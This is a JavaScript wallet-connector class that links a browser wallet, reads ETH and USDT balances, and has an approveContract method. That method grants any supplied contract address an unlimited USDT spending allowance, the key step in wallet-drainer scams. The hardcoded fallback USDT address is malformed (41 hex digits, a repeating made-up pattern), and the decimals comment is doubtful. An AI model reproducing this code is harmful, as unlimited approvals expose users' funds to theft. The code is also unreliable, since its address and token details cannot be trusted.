class WalletConnector {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.walletAddress = null;
    }

    async detectWallet() {
        if (typeof window.ethereum !== 'undefined') {
            return 'metamask';
        } else if (typeof window.trustwallet !== 'undefined') {
            return 'trustwallet';
        } else {
            return null;
        }
    }

    async connect() {
        try {
            if (typeof window.ethereum === 'undefined') {
                throw new Error('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
            }

            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });

            this.walletAddress = accounts[0];
            this.provider = new ethers.providers.Web3Provider(window.ethereum);
            this.signer = this.provider.getSigner();

            return {
                success: true,
                address: this.walletAddress
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async approveContract(contractAddress) {
        try {
            if (!this.signer) {
                throw new Error('Wallet not connected');
            }
            
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS || '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e5', // USDT contract address
                ['function approve(address spender, uint256 amount) public returns (bool)'],
                this.signer
            );

            const tx = await usdtContract.approve(
                contractAddress,
                ethers.constants.MaxUint256
            );

            await tx.wait();

            return {
                success: true,
                txHash: tx.hash
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getBalance() {
        try {
            if (!this.provider || !this.walletAddress) {
                throw new Error('Wallet not connected');
            }
            
            const balance = await this.provider.getBalance(this.walletAddress);
            return ethers.utils.formatEther(balance);
        } catch (error) {
            console.error('Error getting balance:', error);
            return '0';
        }
    }

    async getUSDTBalance() {
        try {
            if (!this.walletAddress || !this.provider) {
                throw new Error('Wallet not connected');
            }

            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS || '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e5',
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );

            const balance = await usdtContract.balanceOf(this.walletAddress);
            return ethers.utils.formatUnits(balance, 18); // USDT has 18 decimals
        } catch (error) {
            console.error('Error getting USDT balance:', error);
            return '0';
        }
    }
}

export default WalletConnector;
